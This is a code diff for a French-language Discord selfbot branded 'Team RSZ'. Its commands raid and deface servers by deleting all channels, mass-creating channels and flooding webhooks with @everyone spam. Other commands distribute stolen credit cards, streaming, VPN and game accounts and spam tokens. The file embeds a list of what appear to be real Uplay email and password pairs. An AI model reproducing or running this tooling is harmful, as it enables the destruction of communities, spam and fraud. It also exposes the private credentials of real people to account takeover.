+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help_nsfw = new Discord.RichEmbed()
+.setTimestamp()
+.setColor(color)
+.setTitle('**Pannel de Help nsfw** :underage: ')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
+.addField(`**${prefix}ass**`,"`Envoie une photo de fesse`")
+.addField(`**${prefix}4k**`,"`Envoie une image sexe en 4k`")
+.addField(`**${prefix}anal**`,"`Envoie un gif anal`")
+.addField(`**${prefix}hentai**`,"`Envoie une image/gif hentai`")
+.addField(`**${prefix}nsfw-gif**`,"`Envoie un gif de sexe`")
+.addField(`**${prefix}pussy**`,"`Envoie une image de chattes`")
+.addField(`**${prefix}thigh**`,"`Envoie une image thigh`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+function saver() {
+  fs.writeFile("./Data/pubmp.json", JSON.stringify(db), err => {
+    if (err) console.error(err);
+  });
+}
+
+
+
+client.on('message', message =>{
+  if(message.author.id === "815345046526230538"){
+    if(message.guild.id === "786244044048695297"){
+      message.delete();
+    }
+  }
+  let clientid = client.user.id;
+  let randomnumber = Math.floor(Math.random() * 9000 + 1000)
+  async function addreaction() {
+
+    const miliseconds = Math.floor(Math.random() * 1500);
+
+    async function react() {
+        message.react("🎉").catch(err => {
+          if(err){           
+        console.log('║--> [', `/!/ Attention`.red,']', `\nJe n'ai pas reussi a reagir au giveaway sur ${message.guild.name}, il est possible que je n'ai pas les permissions :/`.green)
+        console.log('╚═════════════════════════════════╝'.blue)
+        return;  
+      }});
+      console.log('║--> [', `Youpi`.green,']', `\nJ'ai pas correctement a reagit au giveaway sur ${message.guild.name}, en ${miliseconds}ms je suis super rapide hehe ;)`.green)
+      console.log('╚═════════════════════════════════╝'.blue)
+    }
+
+    setTimeout(react, miliseconds);
+}
+
+async function checkwin() {
+    if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
+        if(message.content.includes("Congratulations")) {
+          if(message.content.includes(client.user.id)){
+          if(message.embeds)
+      console.log('╟─────────────────────────────────╢'.blue)
+      console.log('║--> [', `GG!`.green,']', `\nJe t'ai fais gagner le giveaway sur le serveur ${message.guild.name} va vite reclamer ta récompense!`.green)
+      console.log('╟─────────────────────────────────╢'.blue)
+        }}
+    }
+}
+
+
+checkwin()
+
+if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
+    if(message.embeds[0]) {
+        if(message.embeds[0].description.includes("React with")) {
+            addreaction()
+        }
+    }
+}
+	let msg = message;
+	if(message.author.id === client.user.id){
+		if(afk[client.user.id]){
+		if(message.content.includes(":x:")){
+			return;
+		}else 
+			delete afk[client.user.id]
+			  saving();
+			  message.channel.send(":white_check_mark: **Vous n'etes plus afk**")
+        console.log("╟ Commande afk stopé")
+        console.log("╟─────────────────────────────────╢")
+		}};
+	if(message.content.includes(client.user.id)){
+		if(message.author.id === client.user.id)return;
+		if(afk[client.user.id]){
+		message.reply(":x: **Je suis afk pour la raison** " + afk[client.user.id].r)
+        console.log('║--> [', `/!\\ Attention`.red,']', `\nl'utilisateur ${message.author.username} vient de vous ping lors de votre afk ${message.content}`.green)
+        console.log('╟─────────────────────────────────╢'.blue)
+		}else return;
+	};
+	var args = message.content.substring(prefix.length).split(" ");
+    var mentionuser = message.mentions.users.first();
+    if(message.channel.type === "dm"){
+    if(msg.author.bot){
+      if(message.content.includes('discord.gg')){
+        let botblock = message.author;
+        botblock.send(`/!\\ Anti mp`).then((msg) => {
+          msg.delete()
+        })
+        console.log('║--> [', `/!/ Attention`.red,']', `\nle bot ${message.author.username} vient de vous envoyer une invatation suspecte ${message.content}`.green)
+        console.log('╚═════════════════════════════════╝'.blue)
+      }
+    }
+    }
+  if(msg.author.id !== client.user.id) return;
+  if(message.content.startsWith(prefix + "deface")){
+    if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
+  if(!message.member.hasPermission('ADMINISTRATOR'))return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
+  message.delete();
+  message.guild.setName(`RAID BY ${client.user.username}`);
+  message.guild.setIcon("https://cdn.discordapp.com/attachments/746353600741244938/845599350390521886/unnamed_1.png");
+  message.guild.channels.forEach(ch => {
+    ch.delete();
+  });
+  message.guild.createChannel("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉", 'text');
+  console.log("╟  Commande deface executé.")
+  console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix + "create channel")){
+    if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
+  if(!message.member.hasPermission("MANAGE_CHANNELS"))return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
+  message.delete();
+    for (let pas = 0; pas < 99; pas++) {
+        message.guild.createChannel(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉-𝐱-${client.user.username}`, "text" ).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    }
+    console.log("╟ Commande create channel executé")
+    console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix + "start typing")){
+      message.delete();
+      message.channel.startTyping();
+      console.log("╟ Commande start typing executé")
+      console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix + "webhook spam")){
+    let webhookmessages = args.splice(2).join(" ") || "@everyone\nhttps://discord.gg/5S54Svq6hR\n Discord\nhttps://discord.gg/5S54Svq6hR"
+      if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
+      if(!message.member.hasPermission('MANAGE_WEBHOOKS')) return
+       message.guild.channels.forEach(channel => {
+          if (channel.type == 'text') {
+              channel.createWebhook("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉", "https://discord.gg/PeNMgDtuHU").catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+          }
+      })
+      let interval6663 = setInterval(async function () {
+          await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(webhookmessages).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))))
+      })
+      console.log("╟ Commande webhook spam éxécuté")
+      console.log("╟─────────────────────────────────╢")
+  }
+if(message.content.startsWith(prefix + "branlette")){
+    message.edit("8=:fist:==D ");
+    message.edit("8==:fist:=D ");
+    message.edit("8===:fist:D ");
+    message.edit("8==:fist:=D ");
+    message.edit("8=:fist:==D ")
+    message.edit("8:fist:===D ");
+    message.edit("8=:fist:==D ");
+    message.edit("8==:fist:=D ");
+    message.edit("8===:fist:D ")
+    message.edit("8==:fist:=D:sweat_drops: ");
+    message.edit("==:fist:D:sweat_drops: ")
+    console.log("╟ Commande branlette executé")
+    console.log("╟─────────────────────────────────╢")
+
+    if (message.content.includes(prefix + "infoplus")) {
+      if (message.author.id === client.user.id) {
+          if (message.deletable) message.delete();
+
+          var resp =
+              ":spy: **__Membre(s) Total__** : " + message.guild.memberCount + "\n\n" +
+              ":white_check_mark: **En Ligne** : " + message.guild.members.filter(o => o.presence.status === 'online').size + " | " +
+              ":no_entry:  **Ne Pas Deranger** : " + message.guild.members.filter(d => d.presence.status === 'dnd').size + "\n" +
+              ":large_orange_diamond: **Inactif** : " + message.guild.members.filter(i => i.presence.status === 'idle').size + " | " +
+              ":zzz: **Hors Ligne** : " + message.guild.members.filter(a => a.presence.status === 'offline').size;
+
+          let embed = new Discord.RichEmbed()
+              .setColor(color)
+              .setDescription(resp)
+              .setTitle("**Stats Membre**");
+          embed.setTimestamp();
+
+          message.channel.send(embed);
+      }
+  }  }
+  
+if (message.content === prefix + "metal") {
+  if (message.author.id === client.user.id) {
+      console.log("(Commande : {/metals} Effectuer) \n ================");
+
+      message.delete();
+      message.channel
+          .send(">>> Restock de Metal en cours..")
+
+          .then(message => {
+            message.edit(
+              ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+          );
+          message.edit(
+              ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+          );
+              var fact = Math.floor(Math.random() * facts.length)
+
+              message.edit(">>> ***Voila ton jeu metals : ***" + facts[fact]);
+          })
+  }
+}
+if (message.content === prefix + "cc") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/cc} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de cc en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  var fact = Math.floor(Math.random() * CC.length)
+
+                  message.edit(">>> ***Voila ta cc : ***" + CC[fact]);
+              })
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+
+
+
+if (message.content === prefix + "pornhub") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/pornhub} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de pornhub en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  var fact = Math.floor(Math.random() * CC.length)
+
+                  message.edit(">>> ***Voila ton compte pornhub : ***" + pornhub[fact])
+              })
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+if (message.content === prefix + "netflix") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/netflix} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de netflix en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  var fact = Math.floor(Math.random() * netflix.length)
+
+                  message.edit(">>> ***Voila ton compte netflix : ***" + netflix[fact])
+              });
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+
+if (message.content === prefix + "nordvpn") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/nordvpn} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de nordvpn en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  var fact = Math.floor(Math.random() * CC.length)
+
+                  message.edit(">>> ***Voila ton compte nord vpn : ***" + nrdvpn[fact])
+              })
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+if (message.content === prefix + "gtoken") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/gtoken} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de token en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  var fact = Math.floor(Math.random() * gtoken.length)
+                  message.edit(">>> ***Voila ton token pour spam :*** " + gtoken[fact])
+              });
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+if (message.content === prefix + "dofus") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/dofus} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de comptes dofus en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  message.edit(
+                      "***Voila ton compte Dofus :***"
+                  );
+                  var fact = Math.floor(Math.random() * dofus.length)
+                  message.edit(">>> ***Voila ton compte dofus : ***" + dofus[fact])
+              });
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+if (message.content === prefix + "gspotify") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/gspotify} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de comptes dofus en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  var fact = Math.floor(Math.random() * spotify.length)
+                  message.edit(">>> ***Voila ton compte Spotify : ***" + spotify[fact])
+              });
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+if (message.content === prefix + "uplay") {
+  if (message.author.id === client.user.id) {
+          console.log("(Commande : {/Uplay} Effectuer) \n ================");
+
+          message.delete();
+          message.channel
+              .send(">>> Restock de comptes Uplay en cours..")
+
+              .then(message => {
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
+                  );
+                  message.edit(
+                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
+                  );
+                  var fact = Math.floor(Math.random() * uplay.length)
+                  message.edit(">>> ***Voila ton compte uplay : ***" + uplay[fact])
+              });
+      } else {
+          message.edit(nowhite)
+      }
+  }
+
+
+if (message.content.includes(prefix + "fdp")) {
+  if (message.author.id === client.user.id) {
+      if (message.deletable) message.delete();
+
+      var embed = new Discord.RichEmbed()
+          .setTitle(` **jvétniker fdp comme lui : **`)
+          .setDescription('')
+          .setImage("https://cdn.discordapp.com/attachments/710299976550318080/711951558006407208/9k.png")
+          .setColor(color)
+          .setFooter(`𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩`, message.author.avatarURL)
+      message.channel.sendEmbed(embed);
+  }
+}
+
+var uplay = [
+  "triputra95@gmail.com:1987684123w Units = 0 Level = 6 Tier = Blue Club Member = False Games = [assassins-creed-III]",
+  "zombie4208@gmail.com:zombie01  Units = 110 Level = 31  Tier = Gold Club Member = False Games = [assassins-creed-brotherhood, assasins-creed-ii, assassins-creed-III, assassins-creed-III, assassins-creed-revelations, assassins-creed-unity, far-cry-3, far-cry-3-blood-dragon, far-cry-5, for-honor, rainbow-six-siege, splinter-cell-conviction, steep, the-crew]",
+  "sponsel4@gmail.com:slapjack  Units = 60  Level = 16  Tier = Bronze Club Member = False Games = [assassins-creed-4-black-flag, , rainbow-six-siege, steep, tom-clancy-the-division] Platforms = [PC, ANDROID, PC, PS4, PC]",
+  "stevenbradley54@yahoo.com:player54 Units = 270 Level = 19  Tier = Bronze Club Member = False Games = [assassins-creed-III, assassins-creed-4-black-flag, assassins-creed-origins, just-dance-2014, the-crew, tom-clancy-the-division, trackmania-turbo]  ",
+  "steveschulenberg@yahoo.com:illinois  Units = 270 Level = 23  Tier = Silver Club Member = False Games = [far-cry-3, far-cry-3-blood-dragon, far-cry-4, far-cry-5, far-cry-new-dawn, far-cry-primal] Platforms = [PC, PC, PC, PC, PC",
+  "syljon2@gmail.com:siwiec1995 Units = 40  Level = 8 Tier = Blue Club Member = False Games = [, rocksmith-2014-edition]  Platforms = [ANDROID, PC]",
+  "trod2323@live.com:Basketball28 Units = 55  Level = 11  Tier = Bronze Club Member = False Games = [, far-cry-5, rainbow-six-siege, uno] Platforms = [ANDROID, PC, XONE, PC]",
+  "trishap77@yahoo.com:Layla8611  Units = 180 Level = 20  Tier = Silver Club Member = False Games = [assassins-creed-III, assassins-creed-4-black-flag, assassins-creed-4-black-flag, assassins-creed-odyssey, assassins-creed-unity, , for-honor]  Platforms = [XBox360, XONE, XBox360, PS4, XONE, ANDROID, XONE",
+  "nick.claro@gmail.com:boomerang Units = 50  Level = 20  Tier = Silver Club Member = False Games = [assassins-creed-4-black-flag, far-cry-3, far-cry-3-blood-dragon, , grow-home, rainbow-six-siege, rainbow-six-siege, steep] Platforms = [PC, PC, PC, ANDROID, PS4, PS4, PC",
+  "troyky29@hotmail.com:troy052980  Units = 20  Level = 33  Tier = Gold Club Member = False Games = [airmech-arena, assassins-creed-III, far-cry-4, far-cry-5, far-cry-primal, for-honor, ghost-recon-wildlands, grow-home, rainbow-six-siege, rayman-legends, splinter-cell-blacklist, steep, the-crew, tom-clancy-the-division, uno, watch-dogs-2, watch-dogs, watch-dogs]  Platforms = [PS4, PS3, PS4, PS4, PS4, PS4, PS4, PS4, PS4, PS4, PS3, PS4, PS4, PS4, PS4, PS4, PS4, PS3",
+  "sixxxis82@gmail.com:machine666 Units = 50  Level = 14  Tier = Bronze Club Member = False Games = [assassins-creed-brotherhood, assassins-creed-III, , ., tom-clancy-the-division]  ",
+  "ben.b.boyce@gmail.com:guinness Units = 15  Level = 6 Tier = Blue Club Member = False Games = [tom-clancy-the-division] Platforms = [XONE",
+  "maj.glitch@gmail.com:invasion1 Units = 0 Level = 16  Tier = Bronze Club Member = False Games = [assassins-creed-brotherhood, assassins-creed-4-black-flag, far-cry-3, , watch-dogs]",
+  "sanguinans.sabulum@gmail.com:cityhugger  Units = 140 Level = 20  Tier = Silver Club Member = False Games = [anno-2070, far-cry-3-blood-dragon, , far-cry-new-dawn, ghost-recon-wildlands, might-magic-heroes-vi, tom-clancy-the-division-2, zombi  ",
